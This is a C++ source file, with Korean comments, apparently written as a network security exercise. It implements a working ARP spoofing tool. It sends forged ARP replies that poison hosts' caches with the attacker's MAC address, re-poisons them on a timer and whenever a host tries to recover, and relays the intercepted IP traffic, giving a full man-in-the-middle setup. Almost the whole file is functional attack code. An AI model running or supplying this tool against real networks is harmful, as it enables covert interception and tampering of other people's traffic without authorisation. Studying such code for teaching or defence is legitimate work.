#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <vector>
#include <thread>
#include <chrono>
#include <iostream>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"

#pragma pack(push, 1)

// IP 헤더 구조체 (릴레이를 위해 필요)
struct IpHdr final {
    uint8_t ihl_ : 4;
    uint8_t version_ : 4;
    uint8_t tos_;
    uint16_t len_;
    uint16_t id_;
    uint16_t frag_offset_;
    uint8_t ttl_;
    uint8_t pro_;
    uint16_t checksum_;
    Ip sip_;
    Ip dip_;
};

// ARP 패킷 구조체
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

#pragma pack(pop)

// 단방향 (Sender -> Target) 공격 흐름 정보를 담는 구조체
struct Flow {
    Ip senderIp;
    Mac senderMac;
    Ip targetIp;
    Mac targetMac; // 패킷 릴레이를 위해 Target의 MAC 주소도 저장
};

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

bool getMyMac(const char* dev, Mac* mac) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        return false;
    }
    *mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    close(s);
    return true;
}

bool getMyIp(const char* dev, Ip* ip) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return false;
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        return false;
    }
    *ip = Ip(ntohl((reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr))->sin_addr.s_addr));
    close(s);
    return true;
}

// 지정된 IP 주소의 MAC 주소를 알아내는 함수
Mac getMacOf(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIp);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac::nullMac();
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int res = pcap_next_ex(handle, &header, &reply_packet);
        if (res == 0) continue;
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }

        EthArpPacket* arp_reply = (EthArpPacket*)reply_packet;
        if (arp_reply->eth_.type() == EthHdr::Arp &&
            arp_reply->arp_.op() == ArpHdr::Reply &&
            arp_reply->arp_.sip() == targetIp) {
            return arp_reply->arp_.smac();
        }
    }
}

// Sender에게 "Target의 MAC 주소는 Attacker의 MAC 주소다"라고 속이는 ARP Reply 패킷을 전송하는 함수
void sendArpInfection(pcap_t* handle, Mac attackerMac, Mac senderMac, Ip targetIp, Ip senderIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac; // Target의 MAC인 것처럼 속임
    packet.arp_.sip_ = htonl(targetIp); // Target의 IP인 것처럼 속임
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

// 주기적으로 모든 Flow에 대해 ARP Infection을 수행하는 스레드 함수
void infection_thread_func(pcap_t* handle, Mac attackerMac, const std::vector<Flow>& flows) {
    while (true) {
        for (const auto& flow : flows) {
            sendArpInfection(handle, attackerMac, flow.senderMac, flow.targetIp, flow.senderIp);
        }
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    // IP 포워딩 활성화 안내
    std::cout << "[*] Note: For packet relaying to work, IP forwarding must be enabled." << std::endl;
    std::cout << "[*] You can enable it by running: sudo sysctl -w net.ipv4.ip_forward=1" << std::endl;

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    // Jumbo Frame 지원을 위해 snaplen을 65536으로 설정
    pcap_t* pcap = pcap_open_live(dev, 65536, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac attackerMac;
    if (!getMyMac(dev, &attackerMac)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    std::cout << "\nAttacker MAC: " << std::string(attackerMac) << std::endl;

    Ip attackerIp;
    if (!getMyIp(dev, &attackerIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    std::cout << "Attacker IP: " << std::string(attackerIp) << std::endl;

    std::vector<Flow> flows;
    for (int i = 2; i < argc; i += 2) {
        Flow f;
        f.senderIp = Ip(argv[i]);
        f.targetIp = Ip(argv[i+1]);

        std::cout << "\n[Flow " << (i/2) << "] Configuring: " << std::string(f.senderIp) << " -> " << std::string(f.targetIp) << std::endl;
        
        // Sender의 MAC 주소 획득
        f.senderMac = getMacOf(pcap, attackerMac, attackerIp, f.senderIp);
        if (f.senderMac.isNull()) {
            fprintf(stderr, "  - Failed to get MAC for sender %s. Skipping this flow.\n", std::string(f.senderIp).c_str());
            continue;
        }
        std::cout << "  - Sender MAC: " << std::string(f.senderMac) << std::endl;

        // Target의 MAC 주소 획득 (릴레이를 위해 필요)
        f.targetMac = getMacOf(pcap, attackerMac, attackerIp, f.targetIp);
        if (f.targetMac.isNull()) {
            fprintf(stderr, "  - Failed to get MAC for target %s. Skipping this flow.\n", std::string(f.targetIp).c_str());
            continue;
        }
        std::cout << "  - Target MAC: " << std::string(f.targetMac) << std::endl;
        
        flows.push_back(f);
    }

    if (flows.empty()) {
        fprintf(stderr, "\nNo valid flows were configured. Exiting.\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    // 주기적 감염 스레드 시작
    std::thread infectionThread(infection_thread_func, pcap, attackerMac, std::ref(flows));
    infectionThread.detach();

    printf("\nStarting ARP spoofing and packet relaying...\n");

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(pcap));
            break;
        }

        EthHdr* ethHdr = (EthHdr*)packet;
        if (ethHdr->smac() == attackerMac) continue; // Attacker가 보낸 패킷은 무시

        // 1. ARP 패킷 처리 (감염 복구 시도 탐지 및 즉시 재감염)
        if (ethHdr->type() == EthHdr::Arp) {
            ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
            // Sender가 Target의 MAC 주소를 물어볼 때 (ARP Request)
            if (arpHdr->op() == ArpHdr::Request) {
                for (const auto& flow : flows) {
                    if (arpHdr->sip() == flow.senderIp && arpHdr->tip() == flow.targetIp) {
                        printf("Recovery attempt detected! (ARP Request from %s for %s). Re-infecting...\n",
                               std::string(flow.senderIp).c_str(), std::string(flow.targetIp).c_str());
                        sendArpInfection(pcap, attackerMac, flow.senderMac, flow.targetIp, flow.senderIp);
                        break;
                    }
                }
            }
            continue;
        }

        // 2. IP 패킷 처리 (릴레이)
        if (ethHdr->type() == EthHdr::Ip4 && ethHdr->dmac() == attackerMac) {
            IpHdr* ipHdr = (IpHdr*)(packet + sizeof(EthHdr));
            Ip packetSrcIp(ntohl(ipHdr->sip_));
            Ip packetDstIp(ntohl(ipHdr->dip_));

            for (const auto& flow : flows) {
                // 설정된 Flow와 일치하는 패킷인지 확인 (Sender IP와 Target IP가 모두 일치)
                if (packetSrcIp == flow.senderIp && packetDstIp == flow.targetIp) {
                    printf("Relaying packet: %s -> %s\n", std::string(packetSrcIp).c_str(), std::string(packetDstIp).c_str());
                    
                    // 패킷 복사 후 Ethernet 헤더 수정
                    u_char* newPacket = new u_char[header->caplen];
                    memcpy(newPacket, packet, header->caplen);
                    EthHdr* newEthHdr = (EthHdr*)newPacket;
                    newEthHdr->smac_ = attackerMac;      // 출발지 MAC은 Attacker MAC으로
                    newEthHdr->dmac_ = flow.targetMac;   // 목적지 MAC은 실제 Target의 MAC으로
                    
                    pcap_sendpacket(pcap, newPacket, header->caplen);
                    delete[] newPacket;
                    break; // 해당 패킷은 처리되었으므로 루프 종료
                }
            }
        }
    }

    pcap_close(pcap);
    return 0;
}

